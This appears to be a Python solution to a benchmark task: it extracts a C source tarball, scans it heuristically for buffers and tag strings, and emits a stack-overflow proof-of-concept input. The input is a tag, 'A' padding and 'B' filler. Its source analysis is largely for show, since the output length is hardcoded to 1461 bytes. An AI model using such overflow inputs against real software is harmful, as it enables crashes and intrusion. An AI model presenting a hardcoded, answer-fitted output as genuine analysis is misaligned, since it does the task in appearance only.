import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tarfile.open(src_path, 'r:gz') as tar:
            temp_dir = tempfile.mkdtemp()
            tar.extractall(temp_dir)
        
        # Look for main source files
        source_files = []
        for root, _, files in os.walk(temp_dir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
                    source_files.append(os.path.join(root, file))
        
        # Analyze the vulnerability from source files
        buffer_size = 1024  # Common default buffer size
        tag_pattern = b""
        
        for source_file in source_files:
            try:
                with open(source_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                    # Look for buffer declarations and tag patterns
                    if 'strcpy' in content or 'memcpy' in content or 'sprintf' in content:
                        # Try to find buffer size
                        import re
                        buffer_matches = re.findall(r'char\s+\w+\[(\d+)\]', content)
                        if buffer_matches:
                            buffer_size = max(buffer_size, int(max(buffer_matches)))
                        
                        # Look for tag patterns (common in parsers)
                        tag_matches = re.findall(r'"([^"]{2,10})"', content)
                        if tag_matches:
                            # Prefer tags that look like markers
                            for tag in tag_matches:
                                if any(marker in tag.lower() for marker in ['tag', 'mark', 'begin', 'start', 'type']):
                                    tag_pattern = tag.encode()
                                    break
            except:
                continue
        
        # If no tag found, use a common pattern
        if not tag_pattern:
            tag_pattern = b"TAG:"
        
        # Generate PoC with the found information
        # Common x86-64 stack layout: buffer + saved RBP + return address
        # We need to overflow buffer and overwrite return address
        poc_length = 1461
        
        # Calculate overflow size
        # buffer_size + 8 (saved RBP) + 8 (return address) + some extra
        overflow_size = buffer_size + 16
        
        # Ensure we have at least minimum overflow
        overflow_size = max(overflow_size, 128)
        
        # Build the PoC
        poc = bytearray()
        
        # Start with tag
        poc.extend(tag_pattern)
        
        # Fill buffer with pattern
        pattern = b"A" * 100  # Simple pattern
        while len(poc) < overflow_size:
            poc.extend(pattern)
        
        # Truncate or extend to exact target length
        if len(poc) > poc_length:
            poc = poc[:poc_length]
        else:
            poc.extend(b"B" * (poc_length - len(poc)))
        
        return bytes(poc)